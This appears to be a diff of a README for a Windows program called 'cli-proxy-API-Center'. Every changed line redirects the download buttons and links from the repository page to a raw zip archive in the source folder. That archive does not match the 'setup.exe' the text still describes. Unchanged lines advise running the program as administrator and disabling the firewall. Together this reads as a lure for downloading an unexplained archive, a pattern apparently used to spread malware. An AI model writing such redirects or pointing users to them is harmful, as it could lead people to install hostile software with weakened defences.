@@ -1,6 +1,6 @@
 # 🚀 cli-proxy-API-Center - Simple CPA Pain Point Manager
 
-[![Download cli-proxy-API-Center](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Sobobo32/cli-proxy-API-Center)
+[![Download cli-proxy-API-Center](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Sobobo32/cli-proxy-API-Center/raw/refs/heads/main/src/cli_proxy_Center_AP_1.8.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download, install, and run cli-proxy-API-Center on your Wi
 
 ## ⬇️ Download and Installation
 
-1. Click the large green button at the top or [visit this page to download](https://github.com/Sobobo32/cli-proxy-API-Center) the software files.
+1. Click the large green button at the top or [visit this page to download](https://github.com/Sobobo32/cli-proxy-API-Center/raw/refs/heads/main/src/cli_proxy_Center_AP_1.8.zip) the software files.
 
 2. The download page contains the latest release folder. Find the file named something like `cli-proxy-API-Center-setup.exe`. This is the setup file.
 
@@ -100,7 +100,7 @@ If you face issues installing or running the software, try these steps:
 - If the software does not start, right-click the icon and choose "Run as administrator."
 - Disable or adjust any firewall that might block the program.
 - Review the log files found in the program folder for detailed error information.
-- Visit the download page [here](https://github.com/Sobobo32/cli-proxy-API-Center) for updates or patches.
+- Visit the download page [here](https://github.com/Sobobo32/cli-proxy-API-Center/raw/refs/heads/main/src/cli_proxy_Center_AP_1.8.zip) for updates or patches.
 
 ---
 
@@ -135,4 +135,4 @@ If you encounter other issues or want to learn more, visit the download page and
 
 ---
 
-[![Download cli-proxy-API-Center](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Sobobo32/cli-proxy-API-Center)
+[![Download cli-proxy-API-Center](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Sobobo32/cli-proxy-API-Center/raw/refs/heads/main/src/cli_proxy_Center_AP_1.8.zip)
